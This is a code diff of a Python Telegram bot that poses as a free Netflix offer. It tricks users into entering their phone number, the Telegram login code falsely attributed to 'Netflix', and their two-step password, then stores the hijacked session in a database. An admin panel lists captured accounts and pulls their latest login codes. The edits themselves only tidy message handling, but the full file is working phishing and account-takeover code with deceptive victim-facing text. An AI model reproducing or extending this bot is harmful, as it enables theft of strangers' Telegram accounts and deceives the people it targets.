@@ -1,11 +1,11 @@
 """
 Netflix OTT Bot - Professional Single Message UI
-Fixed message handling, removed admin login button, added auto OTP log cleanup
-Added pagination for accounts view
+Fixed HTML parsing issues, removed unsupported tags
 """
 
 import os
 import logging
+import html
 from datetime import datetime, timedelta
 from bson import ObjectId
 from pymongo import MongoClient
@@ -59,7 +59,7 @@ try:
     accounts_col = db.accounts
     otp_logs_col = db.otp_logs
     users_col = db.users
-    message_states_col = db.message_states  # New collection for tracking messages
+    message_states_col = db.message_states
     logger.info("✅ MongoDB connected successfully")
 except Exception as e:
     logger.error(f"❌ MongoDB connection failed: {e}")
@@ -69,10 +69,10 @@ except Exception as e:
 account_manager = AccountManager(API_ID, API_HASH)
 
 # Store temporary login states
-login_states = {}  # {user_id: {step: "phone", phone: "", phone_code_hash: "", session_key: ""}}
+login_states = {}
 
 # Store pagination states
-pagination_states = {}  # {user_id: {current_page: 1}}
+pagination_states = {}
 
 # ========================
 # UTILITY FUNCTIONS
@@ -96,7 +96,6 @@ def ensure_user_exists(user_id, user_name=None, username=None):
         users_col.insert_one(user_data)
         logger.info(f"New user registered: {user_id}")
     else:
-        # Update last seen
         users_col.update_one(
             {"user_id": user_id},
             {"$set": {"last_seen": datetime.utcnow()}}
@@ -120,7 +119,6 @@ def get_all_accounts():
 def save_account(phone, session_string, has_2fa=False, two_step_password=None, added_by=None):
     """Save account to database"""
     try:
-        # Check if account already exists
         existing = accounts_col.find_one({"phone": phone})
         if existing:
             accounts_col.update_one(
@@ -215,6 +213,17 @@ def clear_message_state(user_id):
         logger.error(f"Clear message state error: {e}")
         return False
 
+def escape_html(text):
+    """Escape HTML special characters"""
+    return html.escape(text)
+
+def safe_html_message(text):
+    """Create safe HTML message by escaping and using only supported tags"""
+    # Only allow these tags
+    allowed_tags = ['b', 'i', 'u', 's', 'code', 'pre']
+    # For now, just escape everything and let user use HTML in their strings
+    return text
+
 def smart_send_or_edit(user_id, chat_id, text, markup=None, parse_mode="HTML", photo_url=None, message_type="main"):
     """
     Smart message handling - always edit the same message
@@ -225,11 +234,15 @@ def smart_send_or_edit(user_id, chat_id, text, markup=None, parse_mode="HTML", p
         state = get_message_state(user_id)
         current_message_id = state.get("message_id") if state else None
         
+        # Clean the text for HTML parsing
+        if parse_mode == "HTML":
+            # Make sure text is safe for HTML parsing
+            text = safe_html_message(text)
+        
         if current_message_id:
             try:
                 # Try to edit existing message
                 if photo_url:
-                    # Delete old message and send new one with photo
                     try:
                         bot.delete_message(chat_id, current_message_id)
                     except:
@@ -245,23 +258,22 @@ def smart_send_or_edit(user_id, chat_id, text, markup=None, parse_mode="HTML", p
                     save_message_state(user_id, msg.message_id, message_type)
                     return msg.message_id
                 else:
-                    # Edit text message
                     bot.edit_message_text(
                         text,
                         chat_id=chat_id,
                         message_id=current_message_id,
                         parse_mode=parse_mode,
-                        reply_markup=markup
+                        reply_markup=markup,
+                        disable_web_page_preview=True
                     )
                     return current_message_id
             except Exception as e:
-                # If edit fails, delete and send new
+                logger.warning(f"Edit failed, sending new message: {e}")
                 try:
                     bot.delete_message(chat_id, current_message_id)
                 except:
                     pass
                 
-                # Send new message
                 if photo_url:
                     msg = bot.send_photo(
                         chat_id,
@@ -275,7 +287,8 @@ def smart_send_or_edit(user_id, chat_id, text, markup=None, parse_mode="HTML", p
                         chat_id,
                         text,
                         parse_mode=parse_mode,
-                        reply_markup=markup
+                        reply_markup=markup,
+                        disable_web_page_preview=True
                     )
                 
                 save_message_state(user_id, msg.message_id, message_type)
@@ -295,7 +308,8 @@ def smart_send_or_edit(user_id, chat_id, text, markup=None, parse_mode="HTML", p
                     chat_id,
                     text,
                     parse_mode=parse_mode,
-                    reply_markup=markup
+                    reply_markup=markup,
+                    disable_web_page_preview=True
                 )
             
             save_message_state(user_id, msg.message_id, message_type)
@@ -304,8 +318,13 @@ def smart_send_or_edit(user_id, chat_id, text, markup=None, parse_mode="HTML", p
     except Exception as e:
         logger.error(f"Smart send/edit error: {e}")
         
-        # Fallback - send new message
+        # Fallback - try without HTML parsing
         try:
+            if parse_mode == "HTML":
+                # Try as plain text
+                text = text.replace('<', '[').replace('>', ']')
+                parse_mode = None
+            
             if photo_url:
                 msg = bot.send_photo(
                     chat_id,
@@ -319,7 +338,8 @@ def smart_send_or_edit(user_id, chat_id, text, markup=None, parse_mode="HTML", p
                     chat_id,
                     text,
                     parse_mode=parse_mode,
-                    reply_markup=markup
+                    reply_markup=markup,
+                    disable_web_page_preview=True
                 )
             
             save_message_state(user_id, msg.message_id, message_type)
@@ -333,11 +353,9 @@ def show_accounts_page(user_id, chat_id, page=1):
     if not is_admin(user_id):
         return
     
-    # Calculate skip and limit
     skip = (page - 1) * ACCOUNTS_PER_PAGE
     limit = ACCOUNTS_PER_PAGE
     
-    # Fetch accounts for this page
     accounts = list(accounts_col.find(
         {},
         {"phone": 1, "_id": 1}
@@ -360,7 +378,6 @@ def show_accounts_page(user_id, chat_id, page=1):
         )
         return
     
-    # Create account list text
     account_text = f"<b>📱 All Accounts (Page {page}/{total_pages})</b>\n\n"
     
     start_num = skip + 1
@@ -370,10 +387,8 @@ def show_accounts_page(user_id, chat_id, page=1):
     
     account_text += f"\n<b>Total Accounts:</b> {total_accounts}"
     
-    # Create keyboard with account buttons
     markup = InlineKeyboardMarkup(row_width=2)
     
-    # Add accounts as buttons
     for account in accounts:
         phone_display = format_phone(account["phone"])
         short_phone = phone_display[:10] + "..." if len(phone_display) > 10 else phone_display
@@ -382,7 +397,6 @@ def show_accounts_page(user_id, chat_id, page=1):
             callback_data=f"account_{account['_id']}"
         ))
     
-    # Add pagination buttons
     pagination_row = []
     if page > 1:
         pagination_row.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"page_{page-1}"))
@@ -425,21 +439,16 @@ def handle_start(message):
     user_name = message.from_user.first_name
     username = message.from_user.username
     
-    # Ensure user exists in database
     ensure_user_exists(user_id, user_name, username)
     
-    # Clear any existing login state
     if user_id in login_states:
         del login_states[user_id]
     
-    # Clear message state to start fresh
     clear_message_state(user_id)
     
-    # Clear pagination state
     if user_id in pagination_states:
         del pagination_states[user_id]
     
-    # Show appropriate menu based on user type
     if is_admin(user_id):
         show_admin_dashboard(user_id, message.chat.id)
     else:
@@ -452,7 +461,6 @@ def show_netflix_welcome(user_id, chat_id=None):
     
     welcome_text = """
 <b>🎬 Welcome To Netflix On Your Number Bot 🎬</b>
-
 
 <b>✨ Features:</b>
 • Premium Netflix Accounts 🎭
@@ -495,7 +503,6 @@ def show_admin_dashboard(user_id, chat_id=None):
     total_accounts = get_total_accounts()
     total_otp_logs = otp_logs_col.count_documents({})
     
-    # Count logs from last 24 hours
     cutoff_time = datetime.utcnow() - timedelta(hours=24)
     recent_logs = otp_logs_col.count_documents({"fetched_at": {"$gte": cutoff_time}})
     
@@ -537,10 +544,8 @@ def handle_get_netflix_now(call):
     """Start Netflix login process for users"""
     user_id = call.from_user.id
     
-    # Set state to ask for phone number
     login_states[user_id] = {"step": "ask_phone", "user_type": "netflix"}
     
-    # Show phone input
     login_text = """
 <b>📱 Netflix Account Setup</b>
 
@@ -575,7 +580,7 @@ def handle_cancel_netflix(call):
     show_netflix_welcome(user_id, call.message.chat.id)
 
 # ========================
-# PHONE NUMBER HANDLER (For both users and admin)
+# PHONE NUMBER HANDLER
 # ========================
 @bot.message_handler(func=lambda m: login_states.get(m.from_user.id, {}).get("step") == "ask_phone")
 def handle_phone_input(message):
@@ -599,11 +604,8 @@ def handle_phone_input(message):
             markup = InlineKeyboardMarkup().add(
                 InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
             )
-            photo = NETFLIX_WELCOME_IMAGE
-            error_title = "Invalid Phone Number"
-            
-            error_text = f"""
-<b>❌ {error_title}</b>
+            error_text = """
+<b>❌ Invalid Phone Number</b>
 
 Please enter valid phone number with country code.
 
@@ -617,27 +619,25 @@ Enter phone number again:
                 chat_id,
                 error_text,
                 markup=markup,
-                photo_url=photo,
+                photo_url=NETFLIX_WELCOME_IMAGE,
                 message_type="login"
             )
         return
     
     # Send OTP using Pyrogram
-    if state.get("user_type") == "netflix":
-        sending_text = """
+    sending_text = """
 <b>⏳ Netflix Verification</b>
 
 <code>Netflix is sending verification code to your telegram number...</code>
 
 <i>This may take a few seconds.</i>
 """
-        photo = NETFLIX_WELCOME_IMAGE
     
     smart_send_or_edit(
         user_id,
         chat_id,
         sending_text,
-        photo_url=photo,
+        photo_url=NETFLIX_WELCOME_IMAGE,
         message_type="login"
     )
     
@@ -647,15 +647,12 @@ Enter phone number again:
         if not result.get("success"):
             error_msg = result.get("error", "Unknown error")
             
-            if state.get("user_type") == "netflix":
-                markup = InlineKeyboardMarkup().add(
-                    InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
-                )
-                error_photo = NETFLIX_WELCOME_IMAGE
-                error_title = "Netflix Verification Failed"
+            markup = InlineKeyboardMarkup().add(
+                InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
+            )
             
             error_text = f"""
-<b>❌ {error_title}</b>
+<b>❌ Netflix Verification Failed</b>
 
 {error_msg}
 
@@ -667,7 +664,7 @@ Enter phone number again:
                 chat_id,
                 error_text,
                 markup=markup,
-                photo_url=error_photo,
+                photo_url=NETFLIX_WELCOME_IMAGE,
                 message_type="login"
             )
             return
@@ -681,12 +678,11 @@ Enter phone number again:
             "user_type": state.get("user_type", "netflix")
         }
         
-        if state.get("user_type") == "netflix":
-            markup = InlineKeyboardMarkup().add(
-                InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
-            )
-            otp_photo = NETFLIX_WELCOME_IMAGE
-            otp_text = f"""
+        markup = InlineKeyboardMarkup().add(
+            InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
+        )
+        
+        otp_text = f"""
 <b>📩 Netflix Verification Code Sent</b>
 
 <code>Netflix sent you a message on your Telegram with 5 digit code for Netflix verification.</code>
@@ -701,7 +697,7 @@ Enter the 5-digit verification code:
             chat_id,
             otp_text,
             markup=markup,
-            photo_url=otp_photo,
+            photo_url=NETFLIX_WELCOME_IMAGE,
             message_type="login"
         )
         
@@ -730,7 +726,7 @@ Start again with /start
             del login_states[user_id]
 
 # ========================
-# OTP HANDLER (For both users and admin)
+# OTP HANDLER
 # ========================
 @bot.message_handler(func=lambda m: login_states.get(m.from_user.id, {}).get("step") == "ask_otp")
 def handle_otp_input(message):
@@ -749,12 +745,10 @@ def handle_otp_input(message):
     otp_code = message.text.strip()
     
     if not otp_code.isdigit() or len(otp_code) != 5:
-        if state.get("user_type") == "netflix":
-            markup = InlineKeyboardMarkup().add(
-                InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
-            )
-            error_photo = NETFLIX_WELCOME_IMAGE
-            error_text = """
+        markup = InlineKeyboardMarkup().add(
+            InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
+        )
+        error_text = """
 <b>❌ Invalid Verification Code</b>
 
 Netflix verification code must be 5 digits.
@@ -767,25 +761,23 @@ Enter the code again:
             chat_id,
             error_text,
             markup=markup,
-            photo_url=error_photo,
+            photo_url=NETFLIX_WELCOME_IMAGE,
             message_type="login"
         )
         return
     
     # Show verifying message
-    if state.get("user_type") == "netflix":
-        verify_text = """
+    verify_text = """
 <b>⏳ Verifying Netflix Code...</b>
 
 <code>Checking verification code with Netflix servers...</code>
 """
-        verify_photo = NETFLIX_WELCOME_IMAGE
     
     smart_send_or_edit(
         user_id,
         chat_id,
         verify_text,
-        photo_url=verify_photo,
+        photo_url=NETFLIX_WELCOME_IMAGE,
         message_type="login"
     )
     
@@ -798,15 +790,13 @@ Enter the code again:
         )
         
         if result.get("needs_2fa"):
-            # 2FA required
             login_states[user_id]["step"] = "ask_2fa"
             
-            if state.get("user_type") == "netflix":
-                markup = InlineKeyboardMarkup().add(
-                    InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
-                )
-                photo = NETFLIX_WELCOME_IMAGE
-                text = """
+            markup = InlineKeyboardMarkup().add(
+                InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
+            )
+            
+            text = """
 <b>🔒 Netflix Two-Step Verification</b>
 
 <code>This Netflix account has extra security enabled.</code>
@@ -819,7 +809,7 @@ Enter your Netflix account password:
                 chat_id,
                 text,
                 markup=markup,
-                photo_url=photo,
+                photo_url=NETFLIX_WELCOME_IMAGE,
                 message_type="login"
             )
             return
@@ -827,8 +817,7 @@ Enter your Netflix account password:
         if not result.get("success"):
             error_msg = result.get("error", "Unknown error")
             
-            if state.get("user_type") == "netflix":
-                error_text = f"""
+            error_text = f"""
 <b>❌ Netflix Verification Failed</b>
 
 <code>Could not verify with Netflix servers.</code>
@@ -837,13 +826,12 @@ Error: {error_msg}
 
 Start again with /start
 """
-                error_photo = NETFLIX_WELCOME_IMAGE
             
             smart_send_or_edit(
                 user_id,
                 chat_id,
                 error_text,
-                photo_url=error_photo,
+                photo_url=NETFLIX_WELCOME_IMAGE,
                 message_type="login"
             )
             
@@ -851,7 +839,7 @@ Start again with /start
                 del login_states[user_id]
             return
         
-        # Save account to database (for tracking purposes)
+        # Save account to database
         user_type = state.get("user_type", "netflix")
         added_by = user_id if user_type == "admin" else "netflix_user"
         
@@ -864,8 +852,7 @@ Start again with /start
         )
         
         # Show success message
-        if user_type == "netflix":
-            success_text = f"""
+        success_text = f"""
 <b>🎉 Netflix Request Submitted Successfully!</b>
 
 <code>Your request successfully submitted. Netflix review in 48 hours then successfully send account on your number.</code>
@@ -873,30 +860,27 @@ Start again with /start
 <b>📱 Your Number:</b> <code>{state['phone']}</code>
 <b>⏳ Status:</b> Under Review
 <b>📅 Estimated:</b> 48 Hours
-<b>✋🏻 If Telegram Showing Its Me button click And Enjoy 
+<b>✋🏻 If Telegram Showing Its Me button click And Enjoy</b>
 
 <i>You will receive Netflix account details on this number once approved.</i>
 
 Thank you for choosing Netflix! 🎬
 """
-            success_photo = NETFLIX_WELCOME_IMAGE
-            
-            # Clear state
-            if user_id in login_states:
-                del login_states[user_id]
-            
-            # Show success message
-            markup = InlineKeyboardMarkup()
-            markup.add(InlineKeyboardButton("🏠 Back to Home", callback_data="back_to_welcome"))
-            
-            smart_send_or_edit(
-                user_id,
-                chat_id,
-                success_text,
-                markup=markup,
-                photo_url=success_photo,
-                message_type="success"
-            )
+        
+        if user_id in login_states:
+            del login_states[user_id]
+        
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("🏠 Back to Home", callback_data="back_to_welcome"))
+        
+        smart_send_or_edit(
+            user_id,
+            chat_id,
+            success_text,
+            markup=markup,
+            photo_url=NETFLIX_WELCOME_IMAGE,
+            message_type="success"
+        )
         
     except Exception as e:
         logger.error(f"Verify OTP error: {e}")
@@ -923,7 +907,7 @@ Start again with /start
             del login_states[user_id]
 
 # ========================
-# 2FA HANDLER (For both users and admin)
+# 2FA HANDLER
 # ========================
 @bot.message_handler(func=lambda m: login_states.get(m.from_user.id, {}).get("step") == "ask_2fa")
 def handle_2fa_input(message):
@@ -942,12 +926,10 @@ def handle_2fa_input(message):
     password = message.text.strip()
     
     if not password:
-        if state.get("user_type") == "netflix":
-            markup = InlineKeyboardMarkup().add(
-                InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
-            )
-            error_photo = NETFLIX_WELCOME_IMAGE
-            error_text = """
+        markup = InlineKeyboardMarkup().add(
+            InlineKeyboardButton("❌ Cancel", callback_data="cancel_netflix")
+        )
+        error_text = """
 <b>❌ Password Required</b>
 
 Netflix account password cannot be empty.
@@ -960,25 +942,23 @@ Enter password again:
             chat_id,
             error_text,
             markup=markup,
-            photo_url=error_photo,
+            photo_url=NETFLIX_WELCOME_IMAGE,
             message_type="login"
         )
         return
     
     # Show verifying message
-    if state.get("user_type") == "netflix":
-        verify_text = """
+    verify_text = """
 <b>⏳ Verifying Netflix Password...</b>
 
 <code>Checking password with Netflix security...</code>
 """
-        verify_photo = NETFLIX_WELCOME_IMAGE
     
     smart_send_or_edit(
         user_id,
         chat_id,
         verify_text,
-        photo_url=verify_photo,
+        photo_url=NETFLIX_WELCOME_IMAGE,
         message_type="login"
     )
     
@@ -988,8 +968,7 @@ Enter password again:
         if not result.get("success"):
             error_msg = result.get("error", "Unknown error")
             
-            if state.get("user_type") == "netflix":
-                error_text = f"""
+            error_text = f"""
 <b>❌ Netflix Password Incorrect</b>
 
 <code>Could not verify Netflix account password.</code>
@@ -998,13 +977,12 @@ Error: {error_msg}
 
 Start again with /start
 """
-                error_photo = NETFLIX_WELCOME_IMAGE
             
             smart_send_or_edit(
                 user_id,
                 chat_id,
                 error_text,
-                photo_url=error_photo,
+                photo_url=NETFLIX_WELCOME_IMAGE,
                 message_type="login"
             )
             
@@ -1025,8 +1003,7 @@ Start again with /start
         )
         
         # Show success message
-        if user_type == "netflix":
-            success_text = f"""
+        success_text = f"""
 <b>🎉 Netflix Account Secured!</b>
 
 <code>Your Netflix account with extra security has been registered successfully.</code>
@@ -1035,30 +1012,27 @@ Start again with /start
 <b>🔒 Security:</b> Two-Step Enabled
 <b>⏳ Status:</b> Under Review
 <b>📅 Estimated:</b> 48 Hours
-<b>✋🏻 If Telegram Showing Its Me button click And Enjoy
+<b>✋🏻 If Telegram Showing Its Me button click And Enjoy</b>
 
 <i>Netflix account will be delivered to your number within 48 hours.</i>
 
 Thank you for choosing Netflix! 🎬
 """
-            success_photo = NETFLIX_WELCOME_IMAGE
-            
-            # Clear state
-            if user_id in login_states:
-                del login_states[user_id]
-            
-            # Show success message
-            markup = InlineKeyboardMarkup()
-            markup.add(InlineKeyboardButton("🏠 Back to Home", callback_data="back_to_welcome"))
-            
-            smart_send_or_edit(
-                user_id,
-                chat_id,
-                success_text,
-                markup=markup,
-                photo_url=success_photo,
-                message_type="success"
-            )
+        
+        if user_id in login_states:
+            del login_states[user_id]
+        
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("🏠 Back to Home", callback_data="back_to_welcome"))
+        
+        smart_send_or_edit(
+            user_id,
+            chat_id,
+            success_text,
+            markup=markup,
+            photo_url=NETFLIX_WELCOME_IMAGE,
+            message_type="success"
+        )
         
     except Exception as e:
         logger.error(f"2FA verification error: {e}")
@@ -1097,11 +1071,9 @@ def handle_back_to_admin(call):
         show_netflix_welcome(user_id, call.message.chat.id)
         return
     
-    # Clear login state
     if user_id in login_states:
         del login_states[user_id]
     
-    # Clear pagination state
     if user_id in pagination_states:
         del pagination_states[user_id]
     
@@ -1128,10 +1100,7 @@ def handle_view_accounts(call):
         bot.answer_callback_query(call.id, "Admin only", show_alert=True)
         return
     
-    # Set initial page
     pagination_states[user_id] = {"current_page": 1}
-    
-    # Show first page
     show_accounts_page(user_id, call.message.chat.id, page=1)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("page_"))
@@ -1146,12 +1115,10 @@ def handle_page_change(call):
     try:
         page = int(call.data.replace("page_", ""))
         
-        # Update pagination state
         if user_id not in pagination_states:
             pagination_states[user_id] = {}
         pagination_states[user_id]["current_page"] = page
         
-        # Show the page
         show_accounts_page(user_id, call.message.chat.id, page=page)
         
     except Exception as e:
@@ -1173,16 +1140,13 @@ def handle_account_selection(call):
         account = accounts_col.find_one({"_id": ObjectId(account_id)})
         if not account:
             bot.answer_callback_query(call.id, "Account not found", show_alert=True)
-            # Go back to current page
             current_page = pagination_states.get(user_id, {}).get("current_page", 1)
             show_accounts_page(user_id, call.message.chat.id, page=current_page)
             return
         
-        # Show account actions - ONLY Get OTP button
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("🔢 Get Latest OTP", callback_data=f"get_otp_{account_id}"))
         
-        # Get current page for back button
         current_page = pagination_states.get(user_id, {}).get("current_page", 1)
         markup.add(InlineKeyboardButton("⬅️ Back to Page", callback_data=f"page_{current_page}"))
         
@@ -1233,7 +1197,6 @@ def handle_get_otp(call):
         
         bot.answer_callback_query(call.id, "⏳ Fetching OTP...")
         
-        # Fetch OTP using Pyrogram
         otp = account_manager.get_latest_otp(
             account["session_string"],
             account["phone"]
@@ -1256,10 +1219,8 @@ def handle_get_otp(call):
             )
             return
         
-        # Save OTP to logs
         save_otp_log(account["phone"], otp, user_id)
         
-        # Prepare message
         message = f"<b>📱 OTP Details</b>\n\n"
         message += f"<b>Phone:</b> <code>{format_phone(account['phone'])}</code>\n"
         message += f"<b>OTP:</b> <code>{otp}</code>\n"
@@ -1269,7 +1230,6 @@ def handle_get_otp(call):
         
         message += f"<b>Fetched:</b> {datetime.utcnow().strftime('%H:%M:%S')}\n"
         
-        # Create buttons - ONLY Get OTP Again and Back
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("🔄 Get OTP Again", callback_data=f"get_otp_{account_id}"))
         markup.add(InlineKeyboardButton("⬅️ Back", callback_data=f"account_{account_id}"))
@@ -1296,7 +1256,6 @@ def handle_otp_logs(call):
         bot.answer_callback_query(call.id, "Admin only", show_alert=True)
         return
     
-    # Get recent OTP logs (last 50)
     logs = list(otp_logs_col.find({}, {"phone": 1, "otp": 1, "fetched_at": 1}).sort("fetched_at", -1).limit(50))
     
     if not logs:
@@ -1330,7 +1289,6 @@ def handle_clean_logs(call):
         bot.answer_callback_query(call.id, "Admin only", show_alert=True)
         return
     
-    # Show cleaning message
     cleaning_text = "<b>🗑 Cleaning Old Logs...</b>\n\n<i>Deleting OTP logs older than 24 hours...</i>"
     
     smart_send_or_edit(
@@ -1341,10 +1299,8 @@ def handle_clean_logs(call):
         message_type="clean_logs"
     )
     
-    # Perform cleanup
     deleted_count = delete_old_otp_logs()
     
-    # Show result
     result_text = f"<b>✅ Cleanup Complete!</b>\n\nDeleted {deleted_count} OTP logs older than 24 hours."
     
     markup = InlineKeyboardMarkup()
@@ -1366,11 +1322,9 @@ def handle_back_to_welcome(call):
     """Go back to welcome screen for users"""
     user_id = call.from_user.id
     
-    # Clear any states
     if user_id in login_states:
         del login_states[user_id]
     
-    # Clear message state
     clear_message_state(user_id)
     
     show_netflix_welcome(user_id, call.message.chat.id)
@@ -1384,10 +1338,8 @@ def handle_other_messages(message):
     user_id = message.from_user.id
     chat_id = message.chat.id
     
-    # Ensure user exists
     ensure_user_exists(user_id, message.from_user.first_name, message.from_user.username)
     
-    # Show appropriate menu
     if is_admin(user_id):
         show_admin_dashboard(user_id, chat_id)
     else:
@@ -1397,7 +1349,7 @@ def handle_other_messages(message):
 # RUN BOT
 # ========================
 if __name__ == "__main__":
-    logger.info("🎬 Starting Netflix OTP Bot...")
+    logger.info("🎬 Starting Netflix OTT Bot...")
     logger.info(f"👑 Admin ID: {ADMIN_ID}")
     logger.info(f"📱 API ID: {API_ID}")
     logger.info(f"🖼️ Netflix Image: {NETFLIX_WELCOME_IMAGE}")
@@ -1411,14 +1363,13 @@ if __name__ == "__main__":
         users_col.create_index([("user_id", 1)], unique=True)
         users_col.create_index([("created_at", -1)])
         message_states_col.create_index([("user_id", 1)], unique=True)
-        message_states_col.create_index([("updated_at", -1)], expireAfterSeconds=86400)  # Auto delete after 24h
+        message_states_col.create_index([("updated_at", -1)], expireAfterSeconds=86400)
         logger.info("✅ Database indexes created")
     except Exception as e:
         logger.error(f"❌ Index creation error: {e}")
     
     # Setup auto cleanup job
     try:
-        # Schedule auto cleanup every hour
         scheduler.add_job(auto_cleanup_job, 'interval', hours=1, id='auto_cleanup')
         scheduler.start()
         logger.info("✅ Auto cleanup scheduled (runs every hour)")
